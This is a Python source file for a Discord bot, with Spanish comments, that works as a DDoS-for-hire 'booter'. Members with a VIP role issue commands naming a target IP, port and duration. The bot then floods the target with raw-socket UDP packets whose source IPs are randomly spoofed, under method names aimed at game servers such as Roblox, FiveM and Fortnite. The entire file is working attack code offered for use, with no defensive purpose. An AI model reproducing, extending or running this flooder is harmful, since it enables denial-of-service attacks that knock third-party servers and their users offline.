import discord
from discord.ext import commands
import asyncio
import threading
import socket
import time
import random
import struct

TOKEN = 'TU_TOKEN_DISCORD'  # Reemplaza con tu token
INTENTS = discord.Intents.default()
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.members = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070

vip_methods = [
    "free-hudp", "udpbypass", "dnsbypass", "roblox", "fivem",
    "fortnite", "udpraw", "tcproxies", "tcpbypass", "udppps", "samp"
]

# Generador de IP spoofed
def spoof_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Construcción de paquetes con cabeceras fuertes
def build_strong_udp_packet(src_ip, dst_ip, dst_port):
    ip_ihl_ver = (4 << 4) + 5
    ip_tos = 0x10
    ip_tot_len = 28 + 1400
    ip_id = random.randint(1000, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                            ip_frag_off, ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)

    udp_src_port = random.randint(1024, 65535)
    udp_len = 1408
    udp_check = 0
    udp_header = struct.pack('!HHHH', udp_src_port, dst_port, udp_len, udp_check)

    payload = random._urandom(1400)
    return ip_header + udp_header + payload

# Envío del ataque real con spoofing
def strong_udp_bypass(ip, port, duration, stop_event):
    timeout = time.time() + duration
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("ERROR: Debes ejecutar como administrador o root para spoofing.")
        return

    while time.time() < timeout and not stop_event.is_set():
        try:
            for _ in range(200):  # Muchos paquetes por loop
                src_ip = spoof_ip()
                udp_packet = build_strong_udp_packet(src_ip, ip, port)
                sock.sendto(udp_packet, (ip, port))
        except:
            continue

# Iniciar ataque
async def start_attack(ctx, method, ip, port, duration, is_vip=False):
    global global_attack_running

    if not ip or not port or not duration:
        await ctx.send(f"❗ Uso correcto: `!{method} <ip> <port> <time>`")
        return

    if ip == "127.0.0.1":
        await ctx.send("❌ No puedes atacar 127.0.0.1.")
        return

    max_time = 300 if is_vip else 60
    if duration > max_time:
        await ctx.send(f"⚠️ El máximo permitido es {max_time} segundos.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("⛔ Ya tienes un ataque activo.")
        return

    if ctx.author.id in cooldowns:
        await ctx.send("⏳ Debes esperar antes de otro ataque.")
        return

    if global_attack_running:
        await ctx.send("⚠️ Solo un ataque activo global a la vez.")
        return

    global_attack_running = True
    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event

    embed = discord.Embed(
        title="🚀 Ataque Iniciado",
        description=f"**Método:** `{method.upper()}`\n**IP:** `{ip}`\n**Puerto:** `{port}`\n**Duración:** `{duration}s`\n**Usuario:** <@{ctx.author.id}>",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

    thread = threading.Thread(target=strong_udp_bypass, args=(ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)
    if not stop_event.is_set():
        stop_event.set()
        await ctx.send(f"✅ Ataque finalizado para <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

# Comando !methods
@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="📜 Métodos VIP con Bypass", color=discord.Color.blue())
    for method in vip_methods:
        embed.add_field(name=f"!{method}", value="(VIP - BYPASS)", inline=True)
    await ctx.send(embed=embed)

# Crear comandos VIP automáticamente
def make_vip_command(method):
    @bot.command(name=method)
    async def cmd(ctx, ip: str = None, port: int = None, duration: int = None):
        role_names = [r.name.lower() for r in ctx.author.roles]
        if "vip access" not in role_names:
            await ctx.send("❌ Este método es exclusivo de usuarios con **VIP ACCESS**.")
            return
        await start_attack(ctx, method.upper(), ip, port, duration, is_vip=True)
    return cmd

for method in vip_methods:
    make_vip_command(method)

@bot.command()
async def stop(ctx):
    if ctx.author.id not in active_attacks:
        await ctx.send("❌ No tienes ataques activos.")
        return
    active_attacks[ctx.author.id].set()
    await ctx.send("🛑 Ataque detenido.")
    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global global_attack_running
    global_attack_running = False
    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stopall(ctx):
    if ctx.author.id != admin_id:
        await ctx.send("❌ Solo el administrador puede detener todos los ataques.")
        return
    for stop_event in active_attacks.values():
        stop_event.set()
    active_attacks.clear()
    global global_attack_running
    global_attack_running = False
    await ctx.send("🛑 Todos los ataques fueron detenidos.")

@bot.command()
async def dhelp(ctx):
    embed = discord.Embed(title="📘 Comandos disponibles", color=discord.Color.gold())
    for method in vip_methods:
        embed.add_field(name=f"!{method} <ip> <port> <time>", value="(VIP - Bypass)", inline=False)
    embed.add_field(name="!stop", value="Detiene tu ataque actual", inline=False)
    embed.add_field(name="!stopall", value="Admin: Detiene todos los ataques", inline=False)
    embed.add_field(name="!methods", value="Lista de métodos", inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ Bot activo como {bot.user.name}")

bot.run(TOKEN)
